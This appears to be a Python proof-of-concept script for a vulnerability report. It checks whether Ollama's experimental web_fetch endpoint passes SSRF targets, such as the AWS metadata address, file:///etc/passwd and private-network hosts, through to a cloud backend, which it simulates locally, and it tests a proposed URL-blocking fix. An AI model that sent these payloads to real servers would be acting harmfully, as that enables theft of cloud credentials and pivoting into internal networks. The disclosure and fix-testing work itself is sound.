#!/usr/bin/env python3
"""
verify_ollama_ssrf.py
---------------------
Verifies SSRF via /api/experimental/web_fetch in ollama/ollama ≤ 0.18.2

How it works:
  1. Starts a local HTTP capture server (simulates ollama.com cloud backend)
  2. Starts Ollama with OLLAMA_CLOUD_BASE_URL pointing to capture server
  3. Sends requests with IMDS URL, file:// scheme, RFC1918 address
  4. Confirms all are forwarded without filtering (VULNERABLE)
  5. Demonstrates what a fixed validator would block (FIXED)

Requirements:
  - ollama binary in PATH (brew install ollama / https://ollama.com/download)
  - Python 3.8+
  - No external network calls needed

Usage:
  python3 verify_ollama_ssrf.py
  python3 verify_ollama_ssrf.py --ollama-bin /usr/local/bin/ollama
  python3 verify_ollama_ssrf.py --skip-server  # if Ollama already running on :11435
"""

import argparse
import http.server
import ipaddress
import json
import os
import queue
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from typing import Optional

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def red(s):    return f"{RED}{s}{RESET}"
def green(s):  return f"{GREEN}{s}{RESET}"
def yellow(s): return f"{YELLOW}{s}{RESET}"
def cyan(s):   return f"{CYAN}{s}{RESET}"
def bold(s):   return f"{BOLD}{s}{RESET}"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
BANNER = f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗
║  Ollama SSRF Verifier — /api/experimental/web_fetch          ║
║  CVE: TBD  |  CVSS: 8.1 High  |  CWE-918                    ║
║  Affected: ollama/ollama ≤ 0.18.2                            ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""

# ---------------------------------------------------------------------------
# Capture server (simulates ollama.com/api/web_fetch)
# ---------------------------------------------------------------------------
CAPTURE_PORT = 19877
captured: queue.Queue = queue.Queue()

class CaptureHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        try:
            data = json.loads(body)
        except Exception:
            data = {"raw": body.decode(errors="replace")}
        captured.put({"path": self.path, "body": data})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"title":"captured","content":"ok"}')

    def log_message(self, *args):
        pass  # silence

def start_capture_server() -> threading.Thread:
    server = http.server.HTTPServer(("127.0.0.1", CAPTURE_PORT), CaptureHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return t

# ---------------------------------------------------------------------------
# Ollama process management
# ---------------------------------------------------------------------------
OLLAMA_TEST_PORT = 11435
ollama_proc: Optional[subprocess.Popen] = None

def start_ollama(ollama_bin: str) -> bool:
    global ollama_proc
    env = os.environ.copy()
    env["OLLAMA_HOST"] = f"127.0.0.1:{OLLAMA_TEST_PORT}"
    env["OLLAMA_CLOUD_BASE_URL"] = f"http://127.0.0.1:{CAPTURE_PORT}"
    # Suppress model download output
    env["OLLAMA_NOPRUNE"] = "1"

    try:
        ollama_proc = subprocess.Popen(
            [ollama_bin, "serve"],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        print(red(f"  [!] ollama binary not found: {ollama_bin}"))
        return False

    # Wait for Ollama to be ready (up to 8 seconds)
    for _ in range(16):
        time.sleep(0.5)
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{OLLAMA_TEST_PORT}/", timeout=1)
            return True
        except Exception:
            pass
    print(red("  [!] Ollama did not start within 8 seconds"))
    return False

def stop_ollama():
    global ollama_proc
    if ollama_proc:
        ollama_proc.send_signal(signal.SIGTERM)
        try:
            ollama_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            ollama_proc.kill()
        ollama_proc = None

def send_web_fetch(url: str) -> Optional[dict]:
    """POST /api/experimental/web_fetch and return response dict."""
    payload = json.dumps({"url": url}).encode()
    req = urllib.request.Request(
        f"http://127.0.0.1:{OLLAMA_TEST_PORT}/api/experimental/web_fetch",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "body": e.read().decode(errors="replace")}
    except Exception as e:
        return {"error": str(e)}

def drain_captured() -> list:
    items = []
    while not captured.empty():
        try:
            items.append(captured.get_nowait())
        except queue.Empty:
            break
    return items

# ---------------------------------------------------------------------------
# Fix validator (pure Python equivalent of the Go fix)
# ---------------------------------------------------------------------------
def validate_fetch_url_fixed(raw_url: str) -> Optional[str]:
    """
    Returns None if URL passes (safe), or an error string if blocked.
    This mirrors the Go fix proposed in the report.
    """
    try:
        u = urllib.parse.urlparse(raw_url)
    except Exception as e:
        return f"invalid URL: {e}"

    # Block non-HTTP schemes
    if u.scheme not in ("http", "https"):
        return f"URL scheme {u.scheme!r} not allowed"

    host = u.hostname or ""

    # Block known cloud metadata hostnames
    blocked_hosts = {"169.254.169.254", "metadata.google.internal", "metadata.internal"}
    if host.lower() in blocked_hosts:
        return "URL targets a restricted metadata host"

    # Try to parse as IP and check ranges
    try:
        ip = ipaddress.ip_address(host)
        if ip.is_loopback:
            return "URL resolves to loopback address"
        if ip.is_private:
            return "URL resolves to private RFC1918 address"
        if ip.is_link_local:
            return "URL resolves to link-local address"
    except ValueError:
        pass  # It's a hostname — DNS resolution not checked here (DNS rebinding is separate)

    return None  # SAFE

# ---------------------------------------------------------------------------
# Test cases
# ---------------------------------------------------------------------------
TEST_URLS = [
    ("AWS IMDS (cloud metadata)",  "http://169.254.169.254/latest/meta-data/"),
    ("file:// scheme",             "file:///etc/passwd"),
    ("RFC1918 private (10.x)",     "http://10.0.0.1/admin"),
    ("RFC1918 private (192.168.x)","http://192.168.1.1/"),
    ("Loopback",                   "http://127.0.0.1/"),
    ("GCP metadata hostname",      "http://metadata.google.internal/"),
    ("Legitimate HTTPS URL",       "https://example.com/"),
]

# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------
def step1_sanity(skip_server: bool) -> bool:
    print(f"\n{bold('[STEP 1] Sanity check — endpoint exists')}")
    if skip_server:
        print(yellow("  Skipping server start (--skip-server flag)"))
        return True

    try:
        req = urllib.request.Request(
            f"http://127.0.0.1:{OLLAMA_TEST_PORT}/api/experimental/web_fetch",
            data=b"{}",
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as r:
            print(green(f"  [+] Endpoint exists — HTTP {r.status}"))
            return True
    except urllib.error.HTTPError as e:
        if e.code in (400, 422):
            print(green(f"  [+] Endpoint exists — HTTP {e.code} (bad input, expected)"))
            return True
        print(red(f"  [-] HTTP {e.code} — unexpected"))
        return False
    except Exception as e:
        print(red(f"  [-] Could not reach Ollama: {e}"))
        return False

def step2_exploit() -> bool:
    print(f"\n{bold('[STEP 2] Confirm SSRF — verify URLs forwarded without filtering')}")
    print(f"  Capture server at http://127.0.0.1:{CAPTURE_PORT}")
    print()

    all_vulnerable = True
    for name, url in TEST_URLS:
        drain_captured()  # clear queue

        resp = send_web_fetch(url)
        captured_items = []
        # Give a moment for async capture
        time.sleep(0.1)
        captured_items = drain_captured()

        if captured_items:
            forwarded_url = captured_items[0]["body"].get("url", "?")
            if url == "https://example.com/":
                print(green(f"  [+] PASS (legit): {name}"))
                print(green(f"      → forwarded: {forwarded_url}"))
            else:
                print(red(f"  [VULN] {name}"))
                print(red(f"      → forwarded without blocking: {forwarded_url}"))
        else:
            # No capture — either blocked by Ollama itself or network issue
            if isinstance(resp, dict) and resp.get("http_error"):
                print(yellow(f"  [?] {name} — HTTP {resp['http_error']} (may be blocked)"))
            else:
                print(yellow(f"  [?] {name} — not captured, response: {resp}"))
            if url != "https://example.com/":
                all_vulnerable = False

    return all_vulnerable

def step3_fix():
    print(f"\n{bold('[STEP 3] Verify fix — proposed validator blocks dangerous URLs')}")
    print()

    all_blocked = True
    for name, url in TEST_URLS:
        err = validate_fetch_url_fixed(url)
        if url == "https://example.com/":
            if err is None:
                print(green(f"  [+] ALLOWED (correct): {name}"))
            else:
                print(red(f"  [-] FALSE POSITIVE — blocked legit URL: {name}: {err}"))
                all_blocked = False
        else:
            if err is not None:
                print(green(f"  [+] BLOCKED: {name}  →  {err}"))
            else:
                print(red(f"  [-] FIX INCOMPLETE — {name} not blocked"))
                all_blocked = False

    return all_blocked

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Verify Ollama SSRF via /api/experimental/web_fetch")
    parser.add_argument("--ollama-bin", default=shutil.which("ollama") or "ollama",
                        help="Path to ollama binary")
    parser.add_argument("--skip-server", action="store_true",
                        help="Skip starting Ollama (use already-running instance on :11435 with OLLAMA_CLOUD_BASE_URL set)")
    args = parser.parse_args()

    print(BANNER)

    # Start capture server
    print(f"{bold('Setup:')} starting capture server on 127.0.0.1:{CAPTURE_PORT} ...")
    start_capture_server()
    time.sleep(0.2)
    print(green("  [+] Capture server ready"))

    # Start Ollama
    if not args.skip_server:
        print(f"  Starting Ollama on 127.0.0.1:{OLLAMA_TEST_PORT} (OLLAMA_CLOUD_BASE_URL → capture server) ...")
        if not start_ollama(args.ollama_bin):
            print(red("\n[!] Could not start Ollama. Make sure 'ollama' is in PATH."))
            print(yellow("    Tip: try --skip-server if Ollama is already running with OLLAMA_CLOUD_BASE_URL set"))
            sys.exit(1)
        print(green(f"  [+] Ollama ready on 127.0.0.1:{OLLAMA_TEST_PORT}"))

    try:
        # Step 1: sanity
        if not step1_sanity(args.skip_server):
            print(red("\n[!] Step 1 failed — endpoint not reachable"))
            sys.exit(1)

        # Step 2: exploit
        vuln_confirmed = step2_exploit()

        # Step 3: fix
        fix_works = step3_fix()

        # Summary
        print(f"\n{bold('='*64)}")
        if vuln_confirmed:
            print(red(bold("  RESULT: VULNERABLE — unsafe URLs forwarded to cloud backend")))
            print(red(       "          An attacker can cause ollama.com to fetch:"))
            print(red(       "          • http://169.254.169.254/  (cloud IAM credentials)"))
            print(red(       "          • file:///etc/passwd       (local file on cloud server)"))
            print(red(       "          • RFC1918 ranges           (internal network pivot)"))
        else:
            print(yellow(bold("  RESULT: Could not confirm — check Ollama logs")))

        if fix_works:
            print(green(bold("  FIX:    Proposed validator correctly blocks all dangerous URLs")))
        else:
            print(red(bold("  FIX:    Proposed validator has gaps — review step 3 output")))

        print(f"{bold('='*64)}\n")

        sys.exit(0 if vuln_confirmed else 1)

    finally:
        if not args.skip_server:
            stop_ollama()

if __name__ == "__main__":
    main()
